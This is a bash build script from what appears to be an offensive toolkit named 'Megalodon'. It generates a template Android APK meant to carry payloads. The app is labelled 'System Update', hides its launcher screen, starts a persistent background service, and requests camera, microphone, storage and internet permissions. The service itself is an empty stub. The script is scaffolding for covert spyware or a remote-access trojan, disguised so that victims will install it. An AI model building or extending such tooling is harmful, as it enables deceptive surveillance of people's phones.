#!/bin/bash
# Megalodon Template APK Builder
# Run once. Produces payloads/android/build/template.apk

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TEMPLATE_OUT="$SCRIPT_DIR/payloads/android/build/template.apk"
WORKDIR="/tmp/megalodon_template_build"

echo "[*] Cleaning workspace..."
rm -rf "$WORKDIR"
mkdir -p "$WORKDIR/src/com/megalodon/payload"
mkdir -p "$WORKDIR/classes"
mkdir -p "$WORKDIR/dex"
mkdir -p "$WORKDIR/out"

echo "[*] Writing AndroidManifest.xml..."
cat > "$WORKDIR/AndroidManifest.xml" << 'MANIFEST_EOF'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.megalodon.payload"
    android:versionCode="1"
    android:versionName="1.0">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="30" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <application
        android:label="System Update"
        android:allowBackup="true"
        android:usesCleartextTraffic="true"
        android:requestLegacyExternalStorage="true">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service
            android:name=".PayloadService"
            android:exported="false" />
    </application>
</manifest>
MANIFEST_EOF

echo "[*] Writing MainActivity.java..."
cat > "$WORKDIR/src/com/megalodon/payload/MainActivity.java" << 'JAVA_EOF'
package com.megalodon.payload;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, PayloadService.class));
        finish();
    }
}
JAVA_EOF

echo "[*] Writing PayloadService.java (stub)..."
cat > "$WORKDIR/src/com/megalodon/payload/PayloadService.java" << 'JAVA_EOF'
package com.megalodon.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class PayloadService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
JAVA_EOF

ANDROID_JAR=$(ls /usr/lib/android-sdk/platforms/*/android.jar 2>/dev/null | head -1)
if [ -z "$ANDROID_JAR" ]; then
    echo "[-] android.jar not found"
    exit 1
fi
echo "[+] Using android.jar: $ANDROID_JAR"

echo "[*] Compiling Java sources..."
javac --release 8 -g:none -cp "$ANDROID_JAR" -d "$WORKDIR/classes" \
    "$WORKDIR/src/com/megalodon/payload/MainActivity.java" \
    "$WORKDIR/src/com/megalodon/payload/PayloadService.java"

echo "[*] Converting to classes.dex..."
dx --dex --min-sdk-version=21 --output="$WORKDIR/dex/classes.dex" "$WORKDIR/classes"

echo "[*] Building base APK with aapt2..."
aapt2 link \
    -o "$WORKDIR/out/base.apk" \
    -I "$ANDROID_JAR" \
    --manifest "$WORKDIR/AndroidManifest.xml"

echo "[*] Adding classes.dex to APK..."
cd "$WORKDIR/dex"
zip -j -q "$WORKDIR/out/base.apk" classes.dex
cd - > /dev/null

mkdir -p "$(dirname "$TEMPLATE_OUT")"
cp "$WORKDIR/out/base.apk" "$TEMPLATE_OUT"

SIZE=$(stat -c%s "$TEMPLATE_OUT")
echo "[+] Template APK created: $TEMPLATE_OUT"
echo "[+] Size: $((SIZE / 1024)) KB"

if [ "$SIZE" -lt 1024 ]; then
    echo "[-] Template too small — something went wrong"
    exit 1
fi

echo "[+] Contents:"
unzip -l "$TEMPLATE_OUT"

echo ""
echo "[✓] Done. You can now run: python3 run.py && payload compile-apk"
